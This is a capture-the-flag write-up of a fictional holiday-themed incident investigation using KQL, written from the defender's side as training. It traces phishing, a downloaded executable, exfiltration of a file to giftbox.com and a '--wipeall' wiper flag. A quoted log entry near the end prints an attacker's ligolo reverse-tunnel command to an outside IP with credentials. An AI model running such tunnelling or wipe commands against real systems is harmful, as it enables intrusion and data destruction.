# KQL Kraken Hunt

### Tools/Skills 

KQL, Incident Investigation, Log Analysis, Decoding Base64-Encoded Powershell Commands

---

## SYNOPSIS

An alert is generated that a malicious link was clicked on by an employee.

I found the email with the malicious link & documented the sender and receiver of the email. I then identitified the victim's role, hostname and ip address. From there, I was able to find the log showing the victim had clicked on the link, when he clicked on it, and then found a file that was subsequently downloaded on his computer. From there, I found that the attacker had created a remote tunnel, then performed a search on network shares. The attacker later exploited a network share to perform lateral movement within the system. After the lateral movement, the attacker performed 3 base64-encoded powershell commands. I decoded these commands and found that the attacker transfered a file out of the system and then deleted the file from the current system.

While this challenge did not go into escalation of events, at this point, if not before, I would be escalating the alert according to a company's playbook.

## SOLUTION & PROCESS

### ONBOARDING

1.  How many Craftperson Elf's are working from laptops?

    **QUERIES:**

    <img src="https://lh7-us.googleusercontent.com/MvbJxM40woFA4Se7p9tWOQm2HNwGU0VDQgfe9utIKP6vvsa2OT6JWrKqioJ1WYPsKbX-Kxi_1b5EWLB025D5RpRtfHJ53VGOeU51G-qtcqW5Ki4NSh1GU9ieXOZO4duxXdgoBWErkX3D-8miDltErz4" alt="" data-size="original">

    **ANSWER:**&#x20;

    <mark style="background-color:green;">25</mark>

### CASE 1

Track down who sent and who received the malicious link, as well as the subject link of the email with the malicious link: '[http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx](http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx)'

#### QUERIES

<figure><img src="https://lh7-us.googleusercontent.com/a5N2k43-CJEp9TZhSDyg4Nx4P4ZqA2Bli0qw_e5X1ca-9gGXB_fnM3zBxDpKOpOEDap0BgaEHeXFVR5oOaCYFaoZ_0LYuk93scdGDoXYI-wUTXEdW77rhHnlMTS-j6yoZ8DQcDVOwerJD3vxgOk_gIM" alt=""><figcaption></figcaption></figure>

#### RESULT

<figure><img src="https://lh7-us.googleusercontent.com/TEWx2TyqxROsCjFM5rLVDceggA-v58xdnk75d9f88OAKCiBLYEhlxGcil-AUbJcfJZyyzZitePm2umcJCDeZje69-uqWagS4uheLhfWUTILchGTo_0y2D7CxT1hSk_EuFKCZOz0WUmWilR8QeuL1rFA" alt=""><figcaption></figcaption></figure>

<mark style="background-color:green;">SENT:</mark> cwombley@gmail.com

<mark style="background-color:green;">RECEIVED:</mark> alabaster\_snowball@santaworkshopgeeseislands.org

<mark style="background-color:green;">SUBJECT LINE:</mark> “\[EXTERNAL] Invoice foir reindeer food past due”

### CASE 2

Find the role, hostname and ip address of the victim.

#### QUERIES:

<figure><img src="https://lh7-us.googleusercontent.com/RYidirBYNrKLo6o40HKkaufZiA4n2ji3zKezkTp7u8M1HVyEtoBI-4BvjDScxEph46J1iNnGrzoj4iAnE3qPH14tttsqmn0cnkqwwUWxZLUCoRt8B6z3NmU1U1lAgEn3Hm77d1We8J25955fe0XUcYc" alt=""><figcaption></figcaption></figure>

#### RESULT:

<figure><img src="https://lh7-us.googleusercontent.com/3Y4irJPGmPvzKY2PccMde4Nyh3TGslugW77Y1DDS_fOj2-nqsyvutvZpaFSOq0Gl42M8OZ-Nlg71Roz1T5Iy7f7ycN2aF6jrzpwxNY_T_FY5kMFdseMNf8ScTMNhPSi4NxXbu2az-hiZAefocI_j8W4" alt=""><figcaption></figcaption></figure>

<mark style="background-color:green;">IP ADDRESS:</mark> 10.10.0.4

<mark style="background-color:green;">ROLE:</mark> Head Elf

<mark style="background-color:green;">HOSTNAME:</mark> Y1US-DESKTOP

### CASE 3

What time did the victim click on the link? Were any files downloaded after he clicked on it?

#### **QUERY 1 (time):**

<figure><img src="https://lh7-us.googleusercontent.com/vjQBuf1AzOctN15_B3oylkiBAH3_onFBlmdKTyKgffISnb3xBUuCo7b97LdE84Exj91KpBBGEgeMtZ2_5bD6u8myMsLlnft-kupBNJAIdTHrdUL4vAgGRT7V-0-mzJRZ6CXWHo78G4PR4pwz6vwYetc" alt=""><figcaption></figcaption></figure>

#### RESULT 1 (time):

<figure><img src="https://lh7-us.googleusercontent.com/PuHI9oixhptbV5-p8QJddSSYdnlMxvt1vo02Z3a06cHAk7ZTRddCIgLyT6L2_FNdaO_pmfGZto-EfOmfVF8_bGb1FsXFaz8Irkr-ZGcRkEYWTf5aKVCVagIeIFwMIJkUCfNnkeJWBJS_K5b-ZD2S2cw" alt=""><figcaption></figcaption></figure>

#### QUERY 2 (downloaded file):

![](https://lh7-us.googleusercontent.com/lRyC6YQ28kU\_pR5nCbn92Fqkuf8GWlyEG5s6imvz\_UOfPsm1xdLBTDzl7Xu0tuykkynOun1tLwwC3oukJcIEqyCJi6EMKUDDL4h3TYRKsXEd8D9KOtO3XCgalEEa1ZS\_VtcVI4il4cozLrD0ZD4Ajyc)

#### RESULT 2 (downloaded file):

<figure><img src="https://lh7-us.googleusercontent.com/i2eMprbbxh1QBb2an7Ne2UfpfVZkAcUYnZUN7Zw4sbRrhOyxnn0ZvrqQIvESit-hKqayao60YeqK9MwELjJJPUjJLFzSiPMna_CIYrguPIHA8O3OGzXOumOeEYTFes2wz3DRyx-lHzmT-tBhO0nRb-0" alt=""><figcaption></figcaption></figure>

<mark style="background-color:green;">TIME (OF CLICK):</mark> 2023-12-02 10:12:42.0000

<mark style="background-color:green;">DOWNLOADED FILE NAME:</mark> giftwrap.exe

### CASE 4

Where did the attacker create a remote tunnel to? When did the attacker enumerate network shares? What hostname did the attack perform lateral movement to get to?

#### Endpoint IP Address from a created Remote Tunnel

#### QUERY

![](https://lh7-us.googleusercontent.com/XVTPmDsMIZEp--ItJ67Fq8\_lDYxkm1jJFZFDYSEfPKS4VH9sEG0vP4kJMd4Qn1eEjM0D9y20XW9igJOstKdr56IzBMQy54zAxKxyHauurHnQYLvV7UgxQ8oQm7DjfcgT5EvUy8hANf4AF1PUw5mXeYs)

#### RESULT:

<figure><img src="https://lh7-us.googleusercontent.com/13na8qbqYkdYLu8903nbmkt5NsLFbw1u5T4GeWbV0T7JWvmpFUVWyW39yFKuoHTGh22vtBCWtBhp9uuFBie4Qp2ncvzQc8BY2Hcu6jfKweDo76UDjX80Nmfb3kHuDsl_XklbYyU6F542kfH1l6iRl_k" alt=""><figcaption></figcaption></figure>

<mark style="background-color:green;">REMOTE TUNNEL IP ADDRESS:</mark> 113.37.9.17

### Time & Hostname

#### QUERY:

![](https://lh7-us.googleusercontent.com/79ZbEpZXt87wTw0uRpiB1OL\_phy2GliL5CgLDTtpqiKxMfFDhn2qazIUfvDU-t0PBbKf2uEl9ngDCn9A6T8natskto503FD1geuQh4YsaKyv0KZwIYZxwDnyilKpAE\_wcPw8vNS-f-F1rP9\_qLfM0NM)

#### RESULT 1 (TIME when attacker enumerated network shares):

<figure><img src="https://lh7-us.googleusercontent.com/utX1fUCATCO1biW6B0EuUWje_NzTER932a0u41DC_I8gR3D-OdP7__DZk1Z9PYGlBkI2BIT7yEbwO_fq7bM4rqilI82rjiEIQDc0BG09ryaHF1DV6qsq2tKmdnTD87_gNppuY-tQBO-2R1kSnt-jSzw" alt=""><figcaption></figcaption></figure>

#### RESULT 2 (Hostname of lateral movement)

<figure><img src="https://lh7-us.googleusercontent.com/uLdRc2VE2m4hC8LNxvb4xW_IfL_GPmfwb36Xn6reOhujuxcmN-1koCRn3DSn2sXZD-oRcCJuzrfpb-f-EroyYY7usaC77uAWSDyDkLDj2a7E48PjywxaekzbluIFVTJoNo7ij25o1ATEbBxJCh3q6HM" alt=""><figcaption></figcaption></figure>

<mark style="background-color:green;">TIME (OF ENUMERATED NETWORK SHARES):</mark> 2023-12-02T16:51:44Z

<mark style="background-color:green;">HOSTNAME (OF LATERAL MOVEMENT):</mark> NorthPolefileshare\


### CASE 5

Find base64 encoded powershell commands and find the name of the file that was transferred and to where.

#### QUERY

<div align="left">

<figure><img src="https://lh7-us.googleusercontent.com/vLnmuC-nBhxoltH41WizoiRsYpbt2IpUgNIzEkO34KEuGHs6XZQUS6DlLpYLLKv84uMe8snT_QziHpl8wmeSAFjNWPNBe1uVsFuoTy10nV6QVQwFkMyupxSh5lvpk15HmyoQXnAtrDNb8XeSqzkH67o" alt=""><figcaption></figcaption></figure>

</div>

#### RESULT

<figure><img src="https://lh7-us.googleusercontent.com/Qh-bkx5hVYtRvROknWUM_UB4SBXF1omukoWjbaWl3Kz-mZ6ul9bOlgs-cC5iKrLte55RmaMy3oR5w-0vuyLBtzHHZGztGneovIuwE-KVO3s-4J2-MyxUDLE-4n_bn2jfwniIv7qqf901B32rj77xC9w" alt=""><figcaption></figcaption></figure>

#### FURTHER STEPS&#x20;

1. I decoded the four, actually 3, base64 encoded texts in Powershell.&#x20;

<figure><img src="https://lh7-us.googleusercontent.com/q1g_wAseK58O47_l_IVAy0iyyezy4DmKcvEP88tYjVhKdwWehMEpxlQgxm8zeZ4mx7rRTIeemWqGXRvFfIVzOxRdFAXyzN0-7PV1-hF6RgA1bLOAVzjC3GQRBVzmSldFnszPWlSuzLvETroDH5QZKDM" alt=""><figcaption></figcaption></figure>

2. One of the decoded messages was written in reverse, so I wrote it backwards, with some help from AI, discovering the file name.&#x20;
3. A 2nd “decoded” message was almost all numbers, which I thought was strange, so I sent it to chatgpt. ChatGPT found how it was encoded and decoded it, showing me the domain the file was sent to.

<mark style="background-color:green;">TIME (OF FIRST ATTACK):</mark> 2023-12-24T16:07:47Z&#x20;

\*NOTE:there was an encoded powershell command before this one, but it was a basic update, not indicative of an attack)

<mark style="background-color:green;">FILE TRANSFERRED:</mark> NaughtyNiceList.txt

<mark style="background-color:green;">DOMAIN (WHERE FILE WAS SENT):</mark> giftbox.com

### CASE 6

Determine executable and command flag

#### QUERY

\*I used the previous query.

#### RESULT

<figure><img src="https://lh7-us.googleusercontent.com/JdZkygDuCblavsOhMKjahEV4S40jsp7rmSXSpIJ3xOmAgKysEiMABSzIq0wDWbHx9mbYsfTpi-U_RzQsAsut7PEtchqVtfD3vpBzx36TKayZe2oa9ZHmBfOTGsP0hz_4yuNFbG3eQjjjbhD_snlPlqw" alt=""><figcaption></figcaption></figure>

<mark style="background-color:green;">EXECUTABLE:</mark> downwithsanta.exe

<mark style="background-color:green;">COMMAND FLAG</mark>: --wipeall



***

## [ChatGPT Prompts/Answers](https://chat.openai.com/share/94431fef-ea99-4e63-a282-69e523da68f7)

#### Example Prompts:

* What signs would there be that a reverse tunnel connection with a compromised machine is made? Where would I find the IP the connection forwarded to? (Using KQL)
* What is the timestamp when the attackers enumerated network shares on the machine?
* What process names would be indicative of this?
*   Is this a reverse tunnel connection?

    "timestamp": 2023-12-02T11:11:29Z,

    "parent\_process\_name": cmd.exe,

    "parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,

    "process\_commandline": "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof,

    "process\_name": ligolo,

    "process\_hash": e9b34c42e29a349620a1490574b87865cc1571f65aa376b928701a034e6b3533,

    "hostname": Y1US-DESKTOP,

    "username": alsnowball
